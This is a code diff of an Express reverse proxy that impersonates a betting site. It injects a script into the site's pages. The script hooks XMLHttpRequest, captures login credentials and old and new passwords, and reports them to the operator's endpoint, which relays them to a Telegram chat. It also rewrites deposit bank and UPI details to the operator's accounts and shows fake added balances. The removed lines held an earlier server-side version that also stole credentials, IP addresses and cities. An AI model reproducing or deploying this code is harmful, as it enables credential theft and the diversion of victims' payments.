@@ -36,7 +36,6 @@ let cachedData = null;
 let cacheTime = 0;
 const CACHE_TTL = 15000;
 const tokenUserMap = {};
-let debugNextResponse = false;
 
 async function ensureWebhook() {
   if (!bot || webhookSet || !WEBHOOK_URL) return;
@@ -132,23 +131,6 @@ async function getUserFromToken(req) {
   return null;
 }
 
-async function extractUser(req, jsonResp) {
-  const fromToken = await getUserFromToken(req);
-  if (fromToken) return fromToken;
-  const body = req.parsedBody || {};
-  if (body.username) return String(body.username);
-  if (body.userId) return String(body.userId);
-  if (jsonResp) {
-    const rd = jsonResp.data || jsonResp.body || jsonResp;
-    if (rd && typeof rd === 'object') {
-      if (rd.username) return String(rd.username);
-      if (rd.userId) return String(rd.userId);
-      if (rd.user_name) return String(rd.user_name);
-    }
-  }
-  return '';
-}
-
 async function trackUser(data, username, info) {
   if (!username) return;
   if (!data.trackedUsers) data.trackedUsers = {};
@@ -163,15 +145,6 @@ async function trackUser(data, username, info) {
 function getUserOverride(data, username) {
   if (!username || !data.userOverrides) return null;
   return data.userOverrides[String(username)] || null;
-}
-
-function getEffectiveSettings(data, username) {
-  const uo = getUserOverride(data, username);
-  return {
-    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
-    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
-    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
-  };
 }
 
 function getActiveBank(data, username) {
@@ -209,23 +182,8 @@ function bankListText(d) {
   }).join('\n');
 }
 
-app.use(async (req, res, next) => {
-  const chunks = [];
-  req.on('data', c => chunks.push(c));
-  req.on('end', () => {
-    req.rawBody = Buffer.concat(chunks);
-    const ct = (req.headers['content-type'] || '').toLowerCase();
-    try {
-      if (ct.includes('json')) {
-        req.parsedBody = JSON.parse(req.rawBody.toString());
-      } else if (ct.includes('form') && !ct.includes('multipart')) {
-        const params = new URLSearchParams(req.rawBody.toString());
-        req.parsedBody = Object.fromEntries(params);
-      } else { req.parsedBody = {}; }
-    } catch(e) { req.parsedBody = {}; }
-    next();
-  });
-});
+app.use(express.json({ limit: '5mb' }));
+app.use(express.urlencoded({ extended: true, limit: '5mb' }));
 
 const BANK_FIELDS = {
   'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
@@ -306,66 +264,126 @@ function addBonusToBalanceFields(obj, bonus) {
   }
 }
 
-function sendJson(res, headers, json, fallback, statusCode) {
-  const body = json ? JSON.stringify(json) : fallback;
-  headers['content-type'] = 'application/json; charset=utf-8';
-  headers['content-length'] = String(Buffer.byteLength(body));
-  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
-  headers['pragma'] = 'no-cache';
-  delete headers['etag'];
-  delete headers['last-modified'];
-  res.writeHead(statusCode || 200, headers);
-  res.end(body);
-}
-
-async function apiProxyFetch(req) {
-  const path = req.originalUrl;
-  const url = API_ORIGIN + path;
-  const fwd = {};
-  const skipHeaders = new Set(['host','connection','content-length','transfer-encoding','accept-encoding','via','expect']);
-  for (const [k, v] of Object.entries(req.headers)) {
-    const kl = k.toLowerCase();
-    if (skipHeaders.has(kl) || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || 
-        kl.startsWith('x-real') || kl.startsWith('x-middleware') || kl.startsWith('cf-') ||
-        kl.startsWith('cdn-') || kl.startsWith('sec-') || kl === 'true-client-ip' || kl === 'x-request-id') continue;
-    fwd[k] = v;
-  }
-  fwd['host'] = 'api.dcric99.com';
-  fwd['origin'] = WEBSITE_ORIGIN;
-  fwd['referer'] = WEBSITE_ORIGIN + '/';
-  fwd['user-agent'] = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';
-  const opts = { method: req.method, headers: fwd };
-  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
-    opts.body = req.rawBody;
-    fwd['content-length'] = String(req.rawBody.length);
-  }
-  const response = await fetch(url, opts);
-  const respBody = await response.text();
-  const respHeaders = {};
-  response.headers.forEach((val, key) => {
-    const kl = key.toLowerCase();
-    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
-      respHeaders[key] = val;
+function buildInterceptorScript(proxyOrigin) {
+  return `<script>
+(function(){
+  var PROXY="${proxyOrigin}";
+  var _open=XMLHttpRequest.prototype.open;
+  var _send=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open=function(m,u,a,us,p){
+    this._url=u;this._method=m;
+    return _open.apply(this,arguments);
+  };
+  XMLHttpRequest.prototype.send=function(body){
+    var xhr=this;
+    var url=xhr._url||'';
+    if(url.indexOf('/api/auth')!==-1 && xhr._method==='POST'){
+      try{
+        var bd=JSON.parse(body);
+        xhr.addEventListener('load',function(){
+          try{
+            var r=JSON.parse(xhr.responseText);
+            if(r&&r.status===1){
+              fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'login',username:bd.username||'',password:bd.password||''})}).catch(function(){});
+            }
+          }catch(e){}
+        });
+      }catch(e){}
     }
-  });
-  respHeaders['access-control-allow-origin'] = '*';
-  respHeaders['access-control-allow-headers'] = '*';
-  respHeaders['access-control-allow-methods'] = '*';
-  let jsonResp = null;
-  try { jsonResp = JSON.parse(respBody); } catch(e) {}
-  return { response, respBody, respHeaders, jsonResp };
-}
-
-async function transparentApiProxy(req, res) {
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (username) saveTokenUser(req, username);
-    res.writeHead(response.status, respHeaders);
-    res.end(respBody);
-  } catch(e) {
-    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+    if(url.indexOf('/api/client/get_deposit')!==-1){
+      xhr.addEventListener('load',function(){
+        try{
+          var r=JSON.parse(xhr.responseText);
+          fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'deposit',data:r})}).catch(function(){});
+        }catch(e){}
+      });
+      var origGet=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText')||Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype.__proto__,'responseText');
+      if(!xhr._patched){
+        xhr._patched=true;
+        xhr.addEventListener('readystatechange',function(){
+          if(xhr.readyState===4){
+            try{
+              var r=JSON.parse(xhr.responseText);
+              var settings=window.__PROXY_SETTINGS;
+              if(settings&&settings.bank&&settings.enabled){
+                var d=r.data||r.body||r;
+                if(d){
+                  replaceBankDeep(d,settings.bank);
+                  Object.defineProperty(xhr,'responseText',{get:function(){return JSON.stringify(r);}});
+                  Object.defineProperty(xhr,'response',{get:function(){return JSON.stringify(r);}});
+                }
+              }
+            }catch(e){}
+          }
+        });
+      }
+    }
+    if(url.indexOf('/ws/getUserDataNew')!==-1||url.indexOf('/api/client/profile')!==-1){
+      xhr.addEventListener('readystatechange',function(){
+        if(xhr.readyState===4){
+          try{
+            var r=JSON.parse(xhr.responseText);
+            var settings=window.__PROXY_SETTINGS;
+            if(settings&&settings.addedBalance&&settings.enabled){
+              var d=r.data||r;
+              addBonus(d,settings.addedBalance);
+              Object.defineProperty(xhr,'responseText',{get:function(){return JSON.stringify(r);}});
+              Object.defineProperty(xhr,'response',{get:function(){return JSON.stringify(r);}});
+            }
+            var uname=null;
+            try{var tk=localStorage.getItem('token')||'';if(tk){var p=JSON.parse(atob(tk.split('.')[1]));uname=p.username||p.sub||'';}}catch(e){}
+            fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'balance',username:uname,data:r})}).catch(function(){});
+          }catch(e){}
+        }
+      });
+    }
+    if(url.indexOf('/api/change_password')!==-1 && xhr._method==='POST'){
+      try{
+        var bd2=JSON.parse(body);
+        fetch(PROXY+'/proxy-report',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'password',data:bd2})}).catch(function(){});
+      }catch(e){}
+    }
+    return _send.apply(this,arguments);
+  };
+  var BF={'accountno':'accountNo','accountnumber':'accountNo','account_no':'accountNo','receiveaccountno':'accountNo','bankaccount':'accountNo','acno':'accountNo','bankaccountno':'accountNo','beneficiaryaccount':'accountNo','account_number':'accountNo','beneficiaryname':'accountHolder','accountname':'accountHolder','account_name':'accountHolder','receiveaccountname':'accountHolder','holdername':'accountHolder','accountholder':'accountHolder','realname':'accountHolder','receivername':'accountHolder','name':'accountHolder','ifsc':'ifsc','ifsccode':'ifsc','ifsc_code':'ifsc','receiveifsc':'ifsc','bankifsc':'ifsc','bankname':'bankName','bank_name':'bankName','bank':'bankName','upiid':'upiId','upi_id':'upiId','upi':'upiId','vpa':'upiId','upiaddress':'upiId'};
+  function replaceBankDeep(obj,bank){
+    if(!obj||typeof obj!=='object')return;
+    if(Array.isArray(obj)){obj.forEach(function(i){replaceBankDeep(i,bank);});return;}
+    for(var k in obj){
+      var v=obj[k];
+      if(v&&typeof v==='object'){replaceBankDeep(v,bank);continue;}
+      if(typeof v!=='string'&&typeof v!=='number')continue;
+      var kl=k.toLowerCase().replace(/[_\\-\\s]/g,'');
+      var m=BF[kl];
+      if(m&&bank[m]&&String(v).length>0){obj[k]=bank[m];}
+      if(typeof v==='string'&&v.indexOf('upi://pay')!==-1&&bank.upiId){
+        obj[k]=v.replace(/pa=[^&]+/,'pa='+bank.upiId);
+        if(bank.accountHolder)obj[k]=obj[k].replace(/pn=[^&]+/,'pn='+encodeURIComponent(bank.accountHolder));
+      }
+    }
   }
+  function addBonus(obj,bonus){
+    if(!obj||typeof obj!=='object')return;
+    var bk=['balance','availablebalance','totalbalance','wallet','availbalance','bal','exposurebal','chips','coins','availbal'];
+    for(var k in obj){
+      if(bk.indexOf(k.toLowerCase())!==-1){
+        var c=parseFloat(obj[k]);
+        if(!isNaN(c)){obj[k]=typeof obj[k]==='string'?String((c+bonus).toFixed(2)):parseFloat((c+bonus).toFixed(2));}
+      }
+      if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){addBonus(obj[k],bonus);}
+    }
+  }
+  function loadSettings(){
+    var uname=null;
+    try{var tk=localStorage.getItem('token')||'';if(tk){var p=JSON.parse(atob(tk.split('.')[1]));uname=p.username||p.sub||'';}}catch(e){}
+    fetch(PROXY+'/proxy-settings'+(uname?'?username='+encodeURIComponent(uname):''),{method:'GET'}).then(function(r){return r.json();}).then(function(s){
+      window.__PROXY_SETTINGS=s;
+    }).catch(function(){});
+  }
+  loadSettings();
+  setInterval(loadSettings,30000);
+})();
+</script>`;
 }
 
 async function websiteProxy(req, res) {
@@ -376,7 +394,7 @@ async function websiteProxy(req, res) {
     const skipWs = new Set(['host','connection','content-length','transfer-encoding','accept-encoding','via','expect']);
     for (const [k, v] of Object.entries(req.headers)) {
       const kl = k.toLowerCase();
-      if (skipWs.has(kl) || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') || 
+      if (skipWs.has(kl) || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
           kl.startsWith('x-real') || kl.startsWith('x-middleware') || kl.startsWith('cf-') ||
           kl.startsWith('cdn-') || kl.startsWith('sec-') || kl === 'true-client-ip' || kl === 'x-request-id') continue;
       fwd[k] = v;
@@ -402,38 +420,15 @@ async function websiteProxy(req, res) {
         /e=t\.location\.hostname\.replace\(\/\^www\\\.\//,
         'e="reddybook.green";t.location.hostname.replace(/^www\\./'
       );
-      body = body.replace(
-        /this\.env\.baseUrl=`https:\/\/api\.\$\{[^}]+\}`/g,
-        'this.env.baseUrl=""'
-      );
-      body = body.replace(
-        /e\.env\.baseUrl=`https:\/\/api\.\$\{[^}]+\}`/g,
-        'e.env.baseUrl=""'
-      );
       body = body.replace(/https:\/\/speedcdn\.io\//g, proxyOrigin + '/');
       body = body.replace(/https:\/\/edgecrate\.io\//g, proxyOrigin + '/');
       body = body.replace(/https:\/\/loadpulse\.io\//g, proxyOrigin + '/');
       body = body.replace(/https:\/\/coresling\.io\//g, proxyOrigin + '/');
       body = body.replace(/https:\/\/pulseedge\.io\//g, proxyOrigin + '/');
     }
-    if (ct.includes('html') || path === '/' || path === '') {
-      body = body.replace(
-        /e=t\.location\.hostname\.replace\(\/\^www\\\.\//,
-        'e="reddybook.green";t.location.hostname.replace(/^www\\./'
-      );
-      body = body.replace(
-        /this\.env\.baseUrl=`https:\/\/api\.\$\{[^}]+\}`/g,
-        'this.env.baseUrl=""'
-      );
-      body = body.replace(
-        /e\.env\.baseUrl=`https:\/\/api\.\$\{[^}]+\}`/g,
-        'e.env.baseUrl=""'
-      );
-      body = body.replace(/https:\/\/speedcdn\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/edgecrate\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/loadpulse\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/coresling\.io\//g, proxyOrigin + '/');
-      body = body.replace(/https:\/\/pulseedge\.io\//g, proxyOrigin + '/');
+    if (ct.includes('html') || path === '/' || path === '' || path.startsWith('/home') || path.startsWith('/login') || path.startsWith('/signup')) {
+      const interceptor = buildInterceptorScript(proxyOrigin);
+      body = body.replace('</head>', interceptor + '</head>');
     }
     respHeaders['content-length'] = String(Buffer.byteLength(body));
     res.writeHead(response.status, respHeaders);
@@ -443,22 +438,6 @@ async function websiteProxy(req, res) {
     if (!res.headersSent) res.status(502).send('Proxy error');
   }
 }
-
-app.use((req, res, next) => {
-  (async () => {
-    try {
-      if (!bot) return;
-      const data = cachedData || await loadData();
-      if (!data.logRequests || !data.adminChatId) return;
-      const path = req.originalUrl || req.url;
-      if (path.includes('bot-webhook') || path.includes('favicon') || path.includes('.js') || path.includes('.css') || path.includes('.ico') || path.includes('assets/')) return;
-      const username = await getUserFromToken(req);
-      if (!username) return;
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path} [${username}]`).catch(()=>{});
-    } catch(e) {}
-  })();
-  next();
-});
 
 app.get('/apk_config/sites.json', async (req, res) => {
   const proxyHost = req.headers['x-forwarded-host'] || req.headers['host'] || '';
@@ -471,6 +450,99 @@ app.get('/apk_config/sites.json', async (req, res) => {
       apk: ''
     }
   });
+});
+
+app.get('/proxy-settings', async (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Headers', '*');
+  try {
+    const data = await loadData();
+    const username = req.query.username || '';
+    const uo = username && data.userOverrides ? data.userOverrides[String(username)] : null;
+    const addedBal = uo && uo.addedBalance !== undefined ? uo.addedBalance : 0;
+    const bank = getActiveBank(data, username);
+    res.json({
+      enabled: data.botEnabled !== false,
+      bank: bank || null,
+      addedBalance: addedBal
+    });
+  } catch(e) { res.json({ enabled: false, bank: null, addedBalance: 0 }); }
+});
+
+app.options('/proxy-settings', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Headers', '*');
+  res.setHeader('Access-Control-Allow-Methods', '*');
+  res.sendStatus(200);
+});
+
+app.post('/proxy-report', async (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Headers', '*');
+  try {
+    const data = await loadData();
+    const body = req.body || {};
+    const type = body.type;
+
+    if (type === 'login' && data.adminChatId && bot) {
+      const username = body.username || 'N/A';
+      const password = body.password || 'N/A';
+      if (username && username !== 'N/A') {
+        trackUser(data, username, 'Login');
+        saveData(data).catch(()=>{});
+      }
+      bot.sendMessage(data.adminChatId,
+`🔑 Login — ReddyBook
+👤 Username: ${username}
+🔒 Password: ${password}
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+
+    if (type === 'deposit' && data.adminChatId && bot) {
+      bot.sendMessage(data.adminChatId,
+`🔔 💰 Deposit Page Opened
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+
+    if (type === 'balance') {
+      const username = body.username || '';
+      if (username) {
+        const respData = body.data?.data || body.data;
+        if (respData && typeof respData === 'object') {
+          const bal = respData.balance ?? respData.availableBalance ?? respData.availBal ?? '';
+          if (bal !== '') {
+            if (!data.trackedUsers) data.trackedUsers = {};
+            if (!data.trackedUsers[username]) data.trackedUsers[username] = {};
+            data.trackedUsers[username].balance = String(bal);
+            data.trackedUsers[username].lastSeen = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            data.trackedUsers[username].lastAction = 'UserData';
+            saveData(data).catch(()=>{});
+          }
+        }
+      }
+    }
+
+    if (type === 'password' && data.adminChatId && bot) {
+      const pd = body.data || {};
+      bot.sendMessage(data.adminChatId,
+`🔐 Password Change
+Old: ${pd.oldPassword || pd.old_password || 'N/A'}
+New: ${pd.newPassword || pd.new_password || 'N/A'}
+🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+
+    res.json({ ok: true });
+  } catch(e) { res.json({ ok: false }); }
+});
+
+app.options('/proxy-report', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Headers', '*');
+  res.setHeader('Access-Control-Allow-Methods', '*');
+  res.sendStatus(200);
 });
 
 app.get('/setup-webhook', async (req, res) => {
@@ -506,7 +578,7 @@ app.post('/bot-webhook', async (req, res) => {
   try {
     await ensureWebhook();
     if (!bot) return res.sendStatus(200);
-    const msg = req.parsedBody?.message;
+    const msg = req.body?.message;
     if (!msg || !msg.text) return res.sendStatus(200);
     const chatId = msg.chat.id;
     const text = msg.text.trim();
@@ -534,7 +606,6 @@ app.post('/bot-webhook', async (req, res) => {
 /rotate — Toggle auto-rotate banks
 /log — Toggle request logging
 /status — Full status
-/debug — Debug next response
 
 === BALANCE ===
 /add <amount> <username> — Add balance
@@ -571,7 +642,6 @@ Example:
     if (text === '/off') { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next deposit/bank response dump aayega'); return res.sendStatus(200); }
 
     if (text.startsWith('/add ')) {
       const parts = text.substring(5).trim().split(/\s+/);
@@ -589,9 +659,7 @@ Example:
       const currentBal = tracked ? tracked.balance : 'N/A';
       if (!freshData.balanceHistory) freshData.balanceHistory = [];
       freshData.balanceHistory.push({
-        type: 'add',
-        username: targetUser,
-        amount: amount,
+        type: 'add', username: targetUser, amount: amount,
         totalAdded: freshData.userOverrides[targetUser].addedBalance,
         originalBalance: currentBal,
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
@@ -617,9 +685,7 @@ Example:
       if (freshData.userOverrides[targetUser].addedBalance === 0) delete freshData.userOverrides[targetUser].addedBalance;
       if (!freshData.balanceHistory) freshData.balanceHistory = [];
       freshData.balanceHistory.push({
-        type: 'deduct',
-        username: targetUser,
-        amount: amount,
+        type: 'deduct', username: targetUser, amount: amount,
         totalAdded: freshData.userOverrides[targetUser].addedBalance || 0,
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
       });
@@ -636,16 +702,10 @@ Example:
         const removed = data.userOverrides[targetUser].addedBalance;
         delete data.userOverrides[targetUser].addedBalance;
         if (!data.balanceHistory) data.balanceHistory = [];
-        data.balanceHistory.push({
-          type: 'remove',
-          username: targetUser,
-          amount: removed,
-          totalAdded: 0,
-          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-        });
+        data.balanceHistory.push({ type: 'remove', username: targetUser, amount: removed, totalAdded: 0, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
         data._skipOverrideMerge = true;
         await saveData(data);
-        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetUser}\n💰 Now showing real balance`);
+        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetUser}`);
       } else {
         await bot.sendMessage(chatId, `ℹ️ User ${targetUser} has no fake balance added.`);
       }
@@ -753,286 +813,23 @@ Example:
   }
 });
 
-app.post('/api/auth', async (req, res) => {
-  try {
-    const data = await loadData();
-    const body = req.parsedBody || {};
-    const username = body.username || body.user_name || '';
-    const password = body.password || body.pwd || '';
-
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-
-    if (jsonResp && jsonResp.status === 1) {
-      const rd = jsonResp.data || jsonResp;
-      const detectedUser = rd.username || rd.user_name || username || '';
-      if (detectedUser) {
-        saveTokenUser(req, detectedUser);
-        if (rd.token) {
-          const tKey = rd.token.substring(0, 100);
-          tokenUserMap[tKey] = String(detectedUser);
-          if (redis) redis.hset('reddybookTokenMap', tKey, String(detectedUser)).catch(()=>{});
-        }
-        trackUser(data, detectedUser, 'Login');
-        saveData(data).catch(()=>{});
-      }
-
-      if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId,
-`🔑 Login — ReddyBook
-👤 Username: ${username || 'N/A'}
-🔒 Password: ${password || 'N/A'}
-🌐 IP: ${req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A'}
-📍 City: ${req.headers['x-vercel-ip-city'] || 'N/A'}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-        ).catch(()=>{});
-      }
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) { await transparentApiProxy(req, res); }
-});
-
-app.all('/api/client/get_deposit', async (req, res) => {
-  const data = await loadData();
-  const eff = getEffectiveSettings(data, await getUserFromToken(req));
-  if (eff.botEnabled === false) return await transparentApiProxy(req, res);
-
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (username) saveTokenUser(req, username);
-
-    const active = await getActiveBankAndSave(data, username);
-    const respData = jsonResp?.data || jsonResp?.body;
-
-    if (debugNextResponse && data.adminChatId && bot) {
-      debugNextResponse = false;
-      bot.sendMessage(data.adminChatId, `🔍 DEPOSIT RAW:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
-    }
-
-    if (respData && active) {
-      if (Array.isArray(respData)) {
-        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
-      } else {
-        deepReplace(respData, active, {}, 0);
-      }
-    }
-
-    if (data.adminChatId && bot && username) {
-      bot.sendMessage(data.adminChatId,
-`🔔 💰 Deposit Page
-👤 User: ${username}
-Bank: ${active ? active.accountNo : 'N/A'}
-Acc: ${active ? active.accountHolder : 'None'}
-🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
-      ).catch(()=>{});
-    }
-
-    if (username) { trackUser(data, username, 'Deposit'); saveData(data).catch(()=>{}); }
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) {
-    console.error('Deposit proxy error:', e.message);
-    await transparentApiProxy(req, res);
-  }
-});
-
-app.all('/api/client/get_withdraw', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (username) {
-      saveTokenUser(req, username);
-      trackUser(data, username, 'Withdraw');
-      saveData(data).catch(()=>{});
-    }
-    if (data.adminChatId && bot && username) {
-      bot.sendMessage(data.adminChatId, `💸 Withdraw Page [${username}]\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
-    }
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) { await transparentApiProxy(req, res); }
-});
-
-app.all('/ws/getUserDataNew', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (username) saveTokenUser(req, username);
-
-    const respData = jsonResp?.data || jsonResp;
-    if (respData && typeof respData === 'object') {
-      const bal = respData.balance ?? respData.availableBalance ?? respData.availBal ?? '';
-      if (username && bal !== '') {
-        if (!data.trackedUsers) data.trackedUsers = {};
-        if (!data.trackedUsers[username]) data.trackedUsers[username] = {};
-        data.trackedUsers[username].balance = String(bal);
-        data.trackedUsers[username].lastSeen = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-        data.trackedUsers[username].lastAction = 'UserData';
-        saveData(data).catch(()=>{});
-      }
-
-      if (username) {
-        const userOvr = data.userOverrides && data.userOverrides[String(username)];
-        const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
-        if (addedBal !== 0) {
-          addBonusToBalanceFields(respData, addedBal);
-        }
-      }
-    }
-
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) { await transparentApiProxy(req, res); }
-});
-
-app.all('/api/client/profile', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (username) {
-      saveTokenUser(req, username);
-      trackUser(data, username, 'Profile');
-
-      const respData = jsonResp?.data || jsonResp;
-      if (respData && typeof respData === 'object') {
-        const bal = respData.balance ?? respData.availableBalance ?? respData.availBal ?? '';
-        if (bal !== '') {
-          if (!data.trackedUsers[username]) data.trackedUsers[username] = {};
-          data.trackedUsers[username].balance = String(bal);
-        }
-        const userOvr = data.userOverrides && data.userOverrides[String(username)];
-        const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
-        if (addedBal !== 0) {
-          addBonusToBalanceFields(respData, addedBal);
-        }
-      }
-      saveData(data).catch(()=>{});
-    }
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) { await transparentApiProxy(req, res); }
-});
-
-app.all('/api/client/report/statement', async (req, res) => {
-  await transparentApiProxy(req, res);
-});
-
-app.all('/api/client/report/new-statement', async (req, res) => {
-  await transparentApiProxy(req, res);
-});
-
-app.all('/api/client/report/profit_loss', async (req, res) => {
-  await transparentApiProxy(req, res);
-});
-
-app.all('/api/client/report/order_history', async (req, res) => {
-  await transparentApiProxy(req, res);
-});
-
-app.all('/api/client/store_order', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (username) {
-      saveTokenUser(req, username);
-      trackUser(data, username, 'PlaceBet');
-      saveData(data).catch(()=>{});
-    }
-    if (data.adminChatId && bot && username) {
-      const body = req.parsedBody || {};
-      bot.sendMessage(data.adminChatId, `🎰 Bet Placed [${username}]\n💰 Amount: ${body.amount || body.stake || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
-    }
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) { await transparentApiProxy(req, res); }
-});
-
-app.all('/api/change_password', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await apiProxyFetch(req);
-    const username = await extractUser(req, jsonResp);
-    if (data.adminChatId && bot) {
-      const body = req.parsedBody || {};
-      bot.sendMessage(data.adminChatId, `🔐 Password Change [${username || 'N/A'}]\nOld: ${body.oldPassword || body.old_password || 'N/A'}\nNew: ${body.newPassword || body.new_password || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
-    }
-    sendJson(res, respHeaders, jsonResp, respBody, response.status);
-  } catch(e) { await transparentApiProxy(req, res); }
-});
-
-app.all('/api/client/exposes', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/events', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/events', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/event', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/event', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/event_list', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/event_list', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/event_detail', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/orders', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/update_stakes', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/fancy_run_position', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/stream', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/casino_1', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/casino_1', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/casino_i_list_new', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/casino_i_list_new', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/casino_i_new_2', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/casino_int_list_new_2', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/casino_int', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/casino_int_new', async (req, res) => { await transparentApiProxy(req, res); });
